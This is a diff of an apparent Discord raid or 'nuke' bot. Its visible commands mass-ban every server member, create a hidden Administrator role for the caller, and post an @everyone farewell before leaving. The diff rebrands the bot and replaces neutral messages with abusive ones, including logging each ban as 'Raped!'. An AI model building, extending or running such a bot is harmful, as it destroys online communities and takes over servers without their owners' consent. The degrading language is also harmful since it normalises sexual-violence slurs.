@@ -21,7 +21,7 @@ bot.remove_command('help')
 
 @bot.event
 async def on_ready():
-    print("LOGGED IN THE BOT. Mady by: AOS")
+    print("LOGGED IN THE BOT. Mady by: The GENTLEMEN")
     myLoop.start()
     await bot.change_presence(activity=discord.Game(name="V1.3 | .help"))
 
@@ -30,7 +30,7 @@ async def on_ready():
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandOnCooldown):
         await ctx.send(
-            f"Tu y/o el servidor estan en un cooldown de 10 minutos** Faltan:  {round(error.retry_after, 2)} ")
+            f"Calm it down fucker this shits on a cooldown for 10 minutes fool** Faltan:  {round(error.retry_after, 2)} ")
 
 
 @bot.command(aliases=["dead"])
@@ -72,7 +72,7 @@ async def on_guild_channel_create(channel):
 #leave
 @bot.command()
 async def bye(ctx):
-    await ctx.send("@everyone Adios xd")
+    await ctx.send("@everyone Cya fuckers xd")
     await ctx.guild.leave()
    
 
@@ -83,7 +83,7 @@ async def banall(ctx):
  for user in ctx.guild.members:
         try:
             await user.ban()
-            print(f"BANNED {user}")
+            print(f"Raped! {user}")
         except:
            pass
     
@@ -96,7 +96,7 @@ async def admin(ctx):
     await ctx.message.delete()
     try:
         guild = ctx.guild
-        role = await guild.create_role(name="DD Admin",
+        role = await guild.create_role(name="GS Admin",
                                        permissions=discord.Permissions(8),
                                        colour=discord.Colour(000000))
         authour = ctx.message.author
